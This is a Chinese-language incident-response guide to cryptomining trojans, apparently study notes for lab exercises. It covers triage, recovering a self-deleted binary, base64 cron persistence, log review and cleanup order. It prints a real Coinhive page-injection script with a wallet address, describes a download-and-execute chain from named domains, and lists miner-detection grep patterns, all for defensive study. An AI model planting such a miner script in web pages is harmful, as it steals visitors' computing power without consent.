# 挖矿木马应急响应

**靶机最常见症状就是 CPU 飙升**，所以这是高频事件类型。

**主流程**：`初步预判 → 系统排查 → 日志排查 → 清除加固`

---

## 一、⭐ 初步预判：怎么判断遭遇挖矿木马

### 三种判定方法（《指南》5.4.1）

1. 被植入挖矿木马的机器出现 **CPU 使用率飙升、系统卡顿、部分服务无法正常运行**
2. 通过服务器性能监测设备查看异常
3. ⭐ **挖矿木马会与矿池地址建立连接**——通过安全监测类设备告警判断

> ⚠️ **CPU 高不等于挖矿**。也可能是：其他恶意程序（DDoS、勒索加密中）、正常业务高负载、被入侵后正在被扫描。**要结合"是否连接矿池"交叉验证。**

### 判断挖矿时间（三个依据，各有局限）

| 依据 | 局限 |
|---|---|
| 挖矿木马**文件创建时间** | 挖矿程序常靠定时任务运行，**每次运行会更新文件时间** |
| **任务计划创建时间** | 任务计划也可能被二次更新而刷新时间 |
| ⭐ **矿池地址连接时间** | 最可靠，但需要监测设备 |

> ⚠️ **关键判读**：有的挖矿木马**具备修改文件创建时间和任务计划创建时间的功能**，用来伪装。
> **所以时间戳不能全信**，要和日志、连接记录交叉。

### 判断传播范围

挖矿木马会与矿池建连，可利用监测设备看范围。若内网未划分安全域，病毒可能大面积传播。

### 网页挖矿（另一类，别混淆）

网页/客户端挖矿是**在页面里嵌 JS**，不是服务器被入侵：

- 现象：**访问网页时浏览器 CPU 飙升**
- 判据：CPU 使用主要来自**浏览器**或未知进程
- 真实案例：页面被植入 Coinhive 在线挖矿代码

```html
<script>
    var script = document.createElement('script');
    script.onload = function () {
        // XMR Pool hash
        var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');
        m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK');
    };
    script.src = 'https://coinhive.com/lib/coinhive.min.js';
    document.head.appendChild(script);
</script>
```

**特征串**：`CoinHive` / `coinhive.min.js` / `cryptonight` / `XMR` / 钱包地址字符串

```bash
# 搜页面里的挖矿 JS
grep -rniE 'coinhive|coin-hive|cryptonight|monero|minero|webmine|authedmine' /var/www/
grep -rniE 'new CoinHive|startMining|CryptoLoot|deepMiner' /var/www/
```

---

## 二、⚠️ 最常见形态：二进制已自删除

**真实案例（Linux）**：CPU 被随机字符串命名的进程 `MLEFDb` 占满，但通过 PID 查进程信息时**发现二进制文件已被自删除**。

**这意味着**：

```
✗ 找不到文件 → 不等于没入侵
✓ 进程还在跑，只是落盘的二进制没了
✓ 必须靠 /proc/<PID>/exe 捞，或从定时任务/服务反查
```

### 处置路径

```bash
# ① 看进程（记下 PID）
top -c
ps aux --sort=-%cpu | head

# ② 反查可执行文件（注意 (deleted) 标记）
ls -l /proc/<PID>/exe
# → /tmp/xxx (deleted)

# ③ ⭐ 从内存捞回二进制（关键一步，别急着 kill）
cp /proc/<PID>/exe /tmp/evidence/recovered_bin
strings /tmp/evidence/recovered_bin | head -50
md5sum /tmp/evidence/recovered_bin

# ④ 判断它怎么被拉起来的
ps -o ppid= -p <PID>           # 拿父进程
ps -p <PPID> -o cmd=            # 父进程是什么

# ⑤ 找持久化（自删除型必然有持久化，否则重启就没了）
crontab -l ; ls -la /etc/cron* ; cat /etc/crontab
ls -la /etc/systemd/system/ ; systemctl list-timers --all
cat /etc/rc.local ; ls /etc/profile.d/
```

> **判据**：二进制自删除 = 攻击者主动擦除痕迹。**先保存内存副本再清理**，否则证据全丢。

---

## 三、⭐ 典型持久化：base64 定时任务

**真实案例完整链条**：

```
① top 发现随机名进程占满 CPU

② /proc/<PID>/exe → 二进制已自删除
   → 由删除时间推断：木马在 20:14 执行结束并自删除
   → 推断服务器在 20:14 前已被植入

③ 排查定时任务 → 发现可疑项
   每 23 分钟执行一次 .aliyun.sh

④ cat .aliyun.sh → 内容为 base64 编码

⑤ base64 -d .aliyun.sh → 真实逻辑：
   先判断运行脚本的用户权限
   然后从随机域名 civiclink.network / onion.in.net 的
       /crn、/int 目录下载文件并授权执行
   → 该下载文件即挖矿母体
```

### 判据汇总

| 信号 | 说明 |
|---|---|
| ⭐ **每隔固定分钟数执行一次**（如 23 分钟） | 异常频率，正常运维任务很少这么设 |
| ⭐ **脚本内容 base64 编码** | 正常运维不会编码脚本 |
| ⭐ **隐藏文件名**（`.` 开头，如 `.aliyun.sh`） | 伪装 |
| ⭐ **伪装成系统/云厂商名**（`aliyun`、`oanacroner`） | 冒充合法 |
| 从随机域名 / 网盘 / 图床下载 | 规避封禁 |

### 排查命令

```bash
# 所有用户 crontab
for u in $(cut -d: -f1 /etc/passwd); do echo "== $u =="; crontab -l -u $u 2>/dev/null; done

# 系统级
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/anacrontab

# 看脚本内容（重点：是否有 base64 / wget / curl / chmod +x）
for f in $(find /etc/cron* /var/spool/cron -type f 2>/dev/null); do
  echo "=== $f ==="; head -20 "$f"
done
```

### 解码 base64

```bash
base64 -d .aliyun.sh            # 直接解码
cat .aliyun.sh | base64 -d
# 嵌套编码时循环解码，或抽出可疑串单独解
```

> 也可以用工具的 `crypto_decode`（支持 29 种编码）。

---

## 四、系统排查

挖矿木马会用系统功能持久化：**用户、服务、任务计划、注册表、启动项**，甚至**修改防火墙策略**。

### 通用思路

```
网络连接 → 找连矿池的 PID → 定位进程 → 找文件
   ↓
查杀后又重启？→ 说明有服务/任务计划在拉起它 → 反查持久化
```

> ⭐ **判据**：**进程查杀后又重新启动** = 一定有持久化机制在守护。此时不要反复 kill，**先去拆持久化**。

### Windows

```cmd
:: ① 用户（含隐藏 $ 账户、克隆账户）
net user
lusrmgr.msc
:: 注册表 F 值比对查克隆账户 → 见 20-accounts.md

:: ② 网络连接（⭐ 找矿池连接 / 找大量 445）
netstat -ano
netstat -ano | find "445"           :: 大量 445 = 永恒之蓝式内网传播
netstat -ano | findstr "ESTABLISHED"

:: ③ 进程
tasklist
tasklist /v                          :: 看用户名、窗口标题
:: CPU 高的逐一排查

:: ④ 服务 / 任务计划
sc query type= service state= all
sc qc <服务名>
schtasks /query /fo LIST /v

:: ⑤ 启动项 / 注册表
msconfig
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Windows 挖矿的典型痕迹**：

| 痕迹 | 真实案例 |
|---|---|
| 后门用户 | `k8h3d`（驱动人生挖矿蠕虫创建） |
| 隐藏用户 | 以 `$` 结尾 |
| 克隆用户 | `admin$`（LP_Check / 注册表 F 值查出） |
| 大量 445 连接 | `netstat -ano \| find "445"` 看到对整网段发送 |
| 恶意服务 | `dBFh` 类无描述服务，`cmd` 拉起 `installed.exe` |

> 工具：**Process Explorer**（能管隐藏进程、挂起、强杀系统级进程）、**PCHunter**、**TCPView**。
> **Process Explorer 的 `VirusTotal` 集成**（Options → VirusTotal.com）可直接查未知进程。

### Linux

```bash
# ① 用户
awk -F: '{if($3==0)print $1}' /etc/passwd      # UID=0
cat /etc/passwd | grep -v nologin | grep -v false
grep useradd /var/log/secure

# ② 进程（CPU 排行）
top -c
ps aux --sort=-%cpu | head -20
ps -ef --forest | head -50                     # 看父子关系

# ③ 网络
ss -antp
netstat -anpt
lsof -i:<port>
# ⭐ 对矿池 IP / 可疑外部 IP 的 ESTABLISHED

# ④ 定时任务（见第三节）
# ⑤ 启动项（见 10-system-basics.md）
# ⑥ 服务
systemctl list-unit-files --state=enabled
systemctl cat <service>

# ⑦ 隐藏进程（挖矿常用 LD_PRELOAD 隐藏自己）
cat /etc/ld.so.preload
unhide proc

# ⑧ 系统命令是否被替换
ls -alh /bin /usr/bin
rpm -Va
```

### 内网传播扩散排查

```bash
# 看是否有对内网的大规模扫描（挖矿蠕虫会扫内网）
netstat -anp | grep -c ESTABLISHED
ss -antp | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head

# 常见内网传播端口
# 445 (SMB/永恒之蓝) / 1433 (MSSQL) / 3306 (MySQL) / 6379 (Redis) / 3389 (RDP) / 23 (Telnet)
grep -rE '445|1433|3389' /var/log/messages 2>/dev/null | head
```

---

## 五、日志排查

```bash
# ⭐ SSH 爆破痕迹（挖矿木马主要靠弱密码爆破进来）
grep "Failed password" /var/log/secure | wc -l
grep "Failed password" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | head
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'    # 成功登录

# ⭐ 定时任务执行记录（挖矿靠 cron 拉起，cron 日志是铁证）
grep CRON /var/log/cron
grep CRON /var/log/syslog

# 系统消息里的下载/执行痕迹
grep -E 'curl|wget|chmod|base64' /var/log/messages | head

# 用户变动
grep -E 'useradd|userdel|passwd' /var/log/secure
```

**Windows 侧**：重点看 **7045（服务创建）**、**4720（创建用户）**、**4624/4625（登录）**。
详见 `../40-log-analysis.md` 事件 ID 表。

> ⚠️ Windows 挖矿案例里还有个重要线索：**安全软件的历史告警记录**。
> 真实案例通过"服务器上的安全软件告警"发现最早的恶意进程执行记录与恶意域名请求，
> 时间比 Webshell 创建时间**早了 6 天**——**这是还原真实时间线的关键**。

---

## 六、清除加固

### ⭐ 清除顺序（《指南》5.2.3 三步，顺序不能乱）

```
① 阻断矿池地址的连接（网络层）
      ↓
② ⭐ 清除定时任务、启动项等持久化
      ↓   ← 必须先做这步！
③ 定位并删除挖矿木马文件
```

> ⚠️ **顺序错误的后果**：真实案例原文——"**若只清除挖矿木马，定时任务会直接执行挖矿脚本
> 或再次从服务器下载挖矿进程，则将导致挖矿进程清除失败**"。
>
> **先删马不拆持久化 = 白干**，马会被拉回来。这和 Webshell 的"删文件不清数据库"是同一类坑。

### 具体命令

**Windows**：

```cmd
netstat -ano                  :: ① 定位挖矿连接 → 拿 PID
tasklist                      :: ② PID → 进程名
:: ③ 任务管理器 → 进程 → 右键"打开文件位置" → 拿到路径 → 删除
:: ④ 别忘了先删 schtasks / sc 里的持久化项
```

**Linux**：

```bash
netstat -anpt                 # ① 拿 PID
ls -alh /proc/<PID>           # ② 反查可执行文件
kill -9 <PID>                 # ③ 结束进程
rm -rf <filename>             # ④ 删除文件
# ⑤ 若 root 都删不掉 → 文件被加了 i 属性
lsattr <filename>
chattr -i <filename>
rm -rf <filename>
```

> ⚠️ **按脚本执行流程确定驻留方法，按顺序清除，避免清除不彻底。**

### 网页挖矿清除

```bash
# 删除页面里的挖矿 JS
grep -rln 'coinhive\|CoinHive\|cryptonight' /var/www/ | xargs -I{} echo {}
# 定位后删除恶意代码段，并排查植入途径（见 events/webshell.md）
```

### 防范（5.2.4）

**僵尸网络侧**：
1. **避免弱密码** —— 僵尸网络有完备的弱密码爆破模块，服务器账户与 MySQL 等服务都要强密码
2. **及时打补丁** —— 厂商通常在漏洞细节公布前就推补丁
3. **服务器定期维护** —— 查 CPU 使用率、可疑进程、任务计划可疑项

**网页/客户端侧**：
1. 浏览网页时注意 **CPU/GPU 使用率**，若飙升且主要来自浏览器则可能嵌入挖矿脚本
2. 避免访问被标记为高风险的网站
3. 避免下载来源不明的客户端和外挂

---

## 七、常见挖矿木马家族（判读线索）

| 家族 | 特征 |
|---|---|
| **WannaMine** | 针对 **WebLogic**，也打 phpMyAdmin、Drupal；**无文件攻击**（WMI 类属性存 shellcode）；用"永恒之蓝" + "Mimikatz+WMIExec" 横向；**2018/06 增加 DDoS 模块** |
| **Mykings（隐匿者）** | 最复杂的僵尸网络之一；"永恒之蓝" + **MsSQL/Telnet/RDP/CCTV 暴力破解**；集成弱密码字典；**蠕虫式传播**；还做锁首页、DDoS |
| **Bulehero** | 专注 Windows 服务器；早期用 IP `173.208.202.234`；**弱密码破解 + 多组件漏洞**；2018/12 成为首个用 RCE 漏洞入侵的病毒 |
| **8220Miner** | **固定使用 8220 端口**；最早用 **Hadoop Yarn 未授权访问**；非蠕虫式，用固定 IP 组全网攻击；⭐ **用 rootkit 技术自我隐藏** |
| **"匿影"** | 携带 **NSA 全套武器库**；利用**网盘和图床**隐藏自己；"永恒之蓝" + "双脉冲星"横向 |

**共性入侵途径**（也是排查线索）：

- **弱密码暴力破解**（SSH / RDP / MSSQL / MySQL / Redis / Telnet）
- **永恒之蓝（MS17-010）** 及各类内网传播漏洞
- **Web 组件漏洞**（WebLogic / phpMyAdmin / Drupal / Hadoop Yarn / ThinkPHP 等 RCE）
- 供应链（如驱动人生挖矿蠕虫）

> **答题提示**：问"攻击者怎么进来的"→ 优先查**弱密码爆破**（`/var/log/secure` 的 Failed password）与**未授权访问的组件服务**。

---

## 八、常见问法与答法

| 问 | 答什么 | 依据 |
|---|---|---|
| 挖矿进程名 / PID | `ps aux --sort=-%cpu` 输出 | 命令输出 |
| 挖矿程序文件路径 | `/proc/<PID>/exe`（**注意 `(deleted)`**） | 命令输出 |
| 连接哪个矿池 | `ss -antp` / `netstat -ano` 的外部地址 | 命令输出 |
| 什么时候被植入的 | 文件创建时间、**任务计划创建时间**、**矿池连接时间**（三者交叉） | 注意时间戳可能被伪造 |
| 怎么持久化的 | 定时任务（每 N 分钟）/ 启动项 / 服务 / 用户 | `crontab -l`、`systemctl`、`sc qc` |
| 用什么账号运行 | 进程 USER 字段 / `ps -o ppid=` 看父进程 | 命令输出 |
| 攻击者怎么进来的 | 弱密码爆破 / 组件漏洞（WebLogic 等）/ 永恒之蓝 | 日志 |
| 脚本内容是什么 | base64 解码后的下载地址与执行逻辑 | `base64 -d` |
| 怎么清除 | **先断矿池 → 再拆持久化 → 最后删文件** | 顺序不能乱 |
| 有没有扩散到其他主机 | 内网连接统计、445 等端口扫描痕迹 | `netstat` / 日志 |

---

## 相关文档

- `../20-accounts.md` — 挖矿常建后门用户（`k8h3d`、`admin$` 克隆账户）
- `../25-process-service.md` — 进程/服务排查、`/proc` 反查、隐藏进程
- `../10-system-basics.md` — 定时任务与启动项完整清单
- `../30-file-artifacts.md` — 文件痕迹与时间戳判据
- `../40-log-analysis.md` — 日志位置与事件 ID
- `webshell.md` — 挖矿常与 Webshell 同时存在
- `../casebook.md` — Windows / Linux 挖矿完整案例
